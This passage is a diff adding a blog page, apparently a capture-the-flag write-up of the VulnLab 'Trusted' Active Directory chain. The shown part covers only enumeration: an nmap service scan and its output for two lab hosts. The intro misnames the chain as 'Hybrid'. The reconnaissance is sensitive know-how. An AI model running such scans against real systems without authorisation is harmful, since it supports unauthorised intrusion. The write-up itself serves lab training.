@@ -1,0 +1,449 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Hybrid is an easy VulnLab chain. Target is: 10.10.161.149 10.10.161.150 Enumeration sudo nmap -sC -sV -iL targets.txt -oN nmap.txt # Nmap 7.95 scan initiated Wed Apr 16 10:16:07 2025 as: /usr/lib/nmap/nmap -sC -sV -iL targets.txt -oN …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="Trusted"/>
+  <meta property="og:description" content="Hybrid is an easy VulnLab chain. Target is: 10.10.161.149 10.10.161.150 Enumeration sudo nmap -sC -sV -iL targets.txt -oN nmap.txt # Nmap 7.95 scan initiated Wed Apr 16 10:16:07 2025 as: /usr/lib/nmap/nmap -sC -sV -iL targets.txt -oN …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/ctf/vulnlab/chains/trusted.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2025-04-16 18:00:00+02:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
+  <meta property="article:section" content="CTF"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; Trusted</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="https://ojack69.github.io/jacks-corner/">
+      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="https://ojack69.github.io/jacks-corner/">Home</a>
+
+  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
+  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
+  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="ctf/vulnlab/chains/trusted">Trusted</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#enumeration" title="Enumeration">Enumeration</a></li><li><a class="toc-href" href="#labdclabtrustedvl" title="labdc.lab.trusted.vl">labdc.lab.trusted.vl</a><ul><li><a class="toc-href" href="#foothold" title="Foothold">Foothold</a></li><li><a class="toc-href" href="#credentials-harvesting" title="Credentials Harvesting">Credentials Harvesting</a></li><li><a class="toc-href" href="#privilege-escalation" title="Privilege Escalation">Privilege Escalation</a></li></ul></li><li><a class="toc-href" href="#trusteddctrustedvl_1" title="trusteddc.trusted.vl">trusteddc.trusted.vl</a><ul><li><a class="toc-href" href="#child-to-parent-privilege-escalation" title="Child to Parent Privilege Escalation">Child to Parent Privilege Escalation</a></li><li><a class="toc-href" href="#efs-encryption-bypass" title="EFS Encryption Bypass">EFS Encryption Bypass</a></li></ul></li></ul></div>
+        </div>
+    <p>Hybrid is an easy VulnLab chain.</p>
+<iframe height="620" src="https://api.vulnlab.com/api/v1/share?id=07ab87ea-e8f7-4ac5-91cf-8edb5e2fc576" width="536"></iframe>
+<p>Target is:</p>
+<ul>
+<li>10.10.161.149</li>
+<li>10.10.161.150</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-iL<span class="w"> </span>targets.txt<span class="w"> </span>-oN<span class="w"> </span>nmap.txt
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">7.95</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">initiated</span><span class="w"> </span><span class="nx">Wed</span><span class="w"> </span><span class="nx">Apr</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">07</span><span class="w"> </span><span class="mi">2025</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">nmap</span><span class="o">/</span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">sC</span><span class="w"> </span><span class="o">-</span><span class="nx">sV</span><span class="w"> </span><span class="o">-</span><span class="nx">iL</span><span class="w"> </span><span class="nx">targets</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="o">-</span><span class="nx">oN</span><span class="w"> </span><span class="nx">nmap</span><span class="p">.</span><span class="nx">txt</span>
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.10.161.149</span>
+<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.032</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
+<span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">987</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="p">(</span><span class="nx">reset</span><span class="p">)</span>
+<span class="nx">PORT</span><span class="w">     </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w">       </span><span class="nx">VERSION</span>
+<span class="mi">53</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">domain</span><span class="w">        </span><span class="nx">Simple</span><span class="w"> </span><span class="nx">DNS</span><span class="w"> </span><span class="nx">Plus</span>
+<span class="mi">88</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">kerberos</span><span class="o">-</span><span class="nx">sec</span><span class="w">  </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Kerberos</span><span class="w"> </span><span class="p">(</span><span class="nx">server</span><span class="w"> </span><span class="nx">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">16</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">20</span><span class="nx">Z</span><span class="p">)</span>
+<span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
+<span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span><span class="w">   </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
+<span class="mi">389</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">trusted</span><span class="p">.</span><span class="nx">vl0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
+<span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span><span class="p">?</span>
+<span class="mi">464</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">kpasswd5</span><span class="p">?</span>
+<span class="mi">593</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ncacn_http</span><span class="w">    </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span><span class="w"> </span><span class="nx">over</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="m m-Double">1.0</span>
+<span class="mi">636</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">tcpwrapped</span>
+<span class="mi">3268</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">trusted</span><span class="p">.</span><span class="nx">vl0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
+<span class="mi">3269</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">tcpwrapped</span>
+<span class="mi">3389</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ms</span><span class="o">-</span><span class="nx">wbt</span><span class="o">-</span><span class="nx">server</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Terminal</span><span class="w"> </span><span class="nx">Services</span>
+<span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">16</span><span class="nx">T08</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">42</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">+</span><span class="mi">5</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">rdp</span><span class="o">-</span><span class="nx">ntlm</span><span class="o">-</span><span class="nx">info</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nx">Target_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">TRUSTED</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">NetBIOS_Domain_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">TRUSTED</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">NetBIOS_Computer_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">TRUSTEDDC</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">DNS_Domain_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">trusted</span><span class="p">.</span><span class="nx">vl</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">DNS_Computer_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">trusteddc</span><span class="p">.</span><span class="nx">trusted</span><span class="p">.</span><span class="nx">vl</span>
+<span class="o">|</span><span class="w">   </span><span class="nx">Product_Version</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">10.0.20348</span>
+<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">System_Time</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">16</span><span class="nx">T08</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">27</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">trusteddc</span><span class="p">.</span><span class="nx">trusted</span><span class="p">.</span><span class="nx">vl</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">15</span><span class="nx">T08</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">27</span>
+<span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">15</span><span class="nx">T08</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">27</span>
+<span class="mi">5985</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">HTTPAPI</span><span class="o">/</span><span class="m m-Double">2.0</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span>
+<span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">Host</span><span class="p">:</span><span class="w"> </span><span class="nx">TRUSTEDDC</span><span class="p">;</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Windows</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">microsoft</span><span class="p">:</span><span class="nx">windows</span>
+
+<span class="nx">Host</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="nx">results</span><span class="p">:</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">mode</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="nx">_</span><span class="w">    </span><span class="nx">Message</span><span class="w"> </span><span class="nx">signing</span><span class="w"> </span><span class="nx">enabled</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="nx">required</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">time</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">16</span><span class="nx">T08</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">31</span>
+<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">start_date</span><span class="p">:</span><span class="w"> </span><span class="nx">N</span><span class="o">/</span><span class="nx">A</span>
+<span class="o">|</span><span class="nx">_clock</span><span class="o">-</span><span class="nx">skew</span><span class="p">:</span><span class="w"> </span><span class="nx">mean</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="nx">s</span><span class="p">,</span><span class="w"> </span><span class="nx">deviation</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="nx">s</span><span class="p">,</span><span class="w"> </span><span class="nx">median</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="nx">s</span>
+
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.10.161.150</span>
+<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.032</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
+<span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">986</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="p">(</span><span class="nx">reset</span><span class="p">)</span>
+<span class="nx">PORT</span><span class="w">     </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w">       </span><span class="nx">VERSION</span>
+<span class="mi">53</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">domain</span><span class="w">        </span><span class="nx">Simple</span><span class="w"> </span><span class="nx">DNS</span><span class="w"> </span><span class="nx">Plus</span>
+<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">Apache</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.4.53</span><span class="w"> </span><span class="p">((</span><span class="nx">Win64</span><span class="p">)</span><span class="w"> </span><span class="nx">OpenSSL</span><span class="o">/</span><span class="m m-Double">1.1.1</span><span class="nx">n</span><span class="w"> </span><span class="nx">PHP</span><span class="o">/</span><span class="m m-Double">8.1.6</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Apache</span><span class="o">/</span><span class="m m-Double">2.4.53</span><span class="w"> </span><span class="p">(</span><span class="nx">Win64</span><span class="p">)</span><span class="w"> </span><span class="nx">OpenSSL</span><span class="o">/</span><span class="m m-Double">1.1.1</span><span class="nx">n</span><span class="w"> </span><span class="nx">PHP</span><span class="o">/</span><span class="m m-Double">8.1.6</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Welcome</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">XAMPP</span>
+<span class="o">|</span><span class="nx">_Requested</span><span class="w"> </span><span class="nx">resource</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">http</span><span class="p">:</span><span class="c1">//10.10.161.150/dashboard/</span>
+<span class="mi">88</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">kerberos</span><span class="o">-</span><span class="nx">sec</span><span class="w">  </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Kerberos</span><span class="w"> </span><span class="p">(</span><span class="nx">server</span><span class="w"> </span><span class="nx">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">16</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">19</span><span class="nx">Z</span><span class="p">)</span>
+<span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
+<span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span><span class="w">   </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
+<span class="mi">389</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">trusted</span><span class="p">.</span><span class="nx">vl0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
+<span class="mi">443</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">http</span><span class="w">      </span><span class="nx">Apache</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.4.53</span><span class="w"> </span><span class="p">((</span><span class="nx">Win64</span><span class="p">)</span><span class="w"> </span><span class="nx">OpenSSL</span><span class="o">/</span><span class="m m-Double">1.1.1</span><span class="nx">n</span><span class="w"> </span><span class="nx">PHP</span><span class="o">/</span><span class="m m-Double">8.1.6</span><span class="p">)</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">tls</span><span class="o">-</span><span class="nx">alpn</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">http</span><span class="o">/</span><span class="m m-Double">1.1</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Welcome</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">XAMPP</span>
+<span class="o">|</span><span class="nx">_Requested</span><span class="w"> </span><span class="nx">resource</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//10.10.161.150/dashboard/</span>
+<span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="nx">TLS</span><span class="w"> </span><span class="nx">randomness</span><span class="w"> </span><span class="nx">does</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="nx">represent</span><span class="w"> </span><span class="nx">time</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Apache</span><span class="o">/</span><span class="m m-Double">2.4.53</span><span class="w"> </span><span class="p">(</span><span class="nx">Win64</span><span class="p">)</span><span class="w"> </span><span class="nx">OpenSSL</span><span class="o">/</span><span class="m m-Double">1.1.1</span><span class="nx">n</span><span class="w"> </span><span class="nx">PHP</span><span class="o">/</span><span class="m m-Double">8.1.6</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">localhost</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2009</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">10</span><span class="nx">T23</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">47</span>
+<span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2019</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">08</span><span class="nx">T23</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">47</span>
+<span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span><span class="p">?</span>
+<span class="mi">464</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">kpasswd5</span><span class="p">?</span>
+<span class="mi">593</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ncacn_http</span><span class="w">    </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span><span class="w"> </span><span class="nx">over</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="m m-Double">1.0</span>
+<span class="mi">636</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">tcpwrapped</span>
+<span class="mi">3306</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">mysql</span><span class="w">         </span><span class="nx">MariaDB</span><span class="w"> </span><span class="m m-Double">5.5.5</span><span class="o">-</span><span class="m m-Double">10.4.24</span>
